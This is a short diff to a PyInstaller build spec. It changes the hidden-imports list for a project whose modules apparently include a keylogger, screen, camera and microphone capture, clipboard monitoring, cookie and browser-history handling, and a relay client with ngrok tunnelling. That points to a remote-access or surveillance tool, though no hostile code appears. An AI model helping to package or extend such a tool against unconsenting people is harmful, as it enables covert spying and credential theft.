@@ -79,12 +79,15 @@ a = Analysis(
         'psutil', 'pyperclip', 'pyngrok',
         'sqlite3', 'pyautogui', 'requests',
         'configparser',
+        # tkinter (needed by privacy_screen; try/except fools PyInstaller's tracer)
+        'tkinter', '_tkinter', 'tkinter.ttk', 'tkinter.constants',
+        'tkinter.filedialog', 'tkinter.messagebox',
         # project modules
         'keylogger', 'screencap', 'controller', 'recorder',
         'camera', 'clipboard_monitor', 'microphone',
         'relay_client', 'server',
-        'export_cookies', 'import_cookies', 'sysinfo',
-        'browser_history', 'wintools',
+        'file_manager', 'processes', 'cookie_manager', 'browser_history',
+        'windows_control', 'wintools', 'sysinfo',
         'privacy_screen', 'webview', 'webview.platforms.winforms',
         'updater',
     ],
